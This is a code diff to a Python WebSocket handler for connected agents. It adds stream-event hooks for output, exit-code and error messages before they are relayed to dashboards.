@@ -225,10 +225,18 @@ async def ws_agent(ws: WebSocket):
                 except Exception:
                     pass
             elif 'output' in data:
+                try:
+                    await manager.on_agent_stream(agent_id, 'output', str(data['output']))
+                except Exception:
+                    pass
                 await manager.relay_output_to_dashboards(agent_id, str(data['output']))
             elif 'line' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['line']))
             elif 'exit_code' in data:
+                try:
+                    await manager.on_agent_stream(agent_id, 'exit_code', int(data['exit_code']))
+                except Exception:
+                    pass
                 await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
             elif data.get('type') == 'audio_segment':
                 # Persist audio clip under 'audio' kind
@@ -252,6 +260,10 @@ async def ws_agent(ws: WebSocket):
                 except Exception:
                     pass
             elif 'error' in data:
+                try:
+                    await manager.on_agent_stream(agent_id, 'error', str(data['error']))
+                except Exception:
+                    pass
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
                 # Unrecognized; forward raw
